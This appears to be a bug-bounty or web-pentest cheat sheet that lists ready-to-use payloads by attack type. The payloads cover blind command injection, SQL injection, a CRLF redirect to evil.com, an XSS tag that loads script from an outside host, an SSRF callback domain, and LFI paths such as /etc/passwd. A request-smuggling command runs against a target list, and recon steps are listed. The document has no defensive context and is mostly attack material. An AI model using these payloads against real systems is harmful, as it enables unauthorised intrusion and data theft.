```
==> blind command injection
|sleep+10
;sleep+10
$(id)

==> Sql injection
'
"
`
&apos;

==> CRLF
%0D%0ALocation:%20https://evil.com

==> HTTP Request Smuggling
cat ~/Downloads/tinder/live.txt|  python3 smuggler.py -q

==> ssrf
d1pice0ckt00ds3g8e90ainzeq3b7texg.oast.site

==> other
%00
../
%0a

==> XSS
<h1>xsstest</h1>
"><script src="https://js.rip/tcug8u8vgc"></script>

==> LFI
/js/main.js
/WEB-INF/web.xml
/etc/passwd

==> ysoserilize
./generate_all_payloads.sh
and use burp

==> check put-method-enabled in every path

==> FUZZ path(dirsearch, pathbrute, dirb) and parameter(burp-parameter-names) and file with extension(zip,txt,csv,tar,gz,7z,tar.gz)

==> TYPE jugling

==> Trufflehog in .js file

==> Droking

==> port scan 80,443,8080,8443,3000,4443,4080,8880

==> Vhost check

==> nuclei


```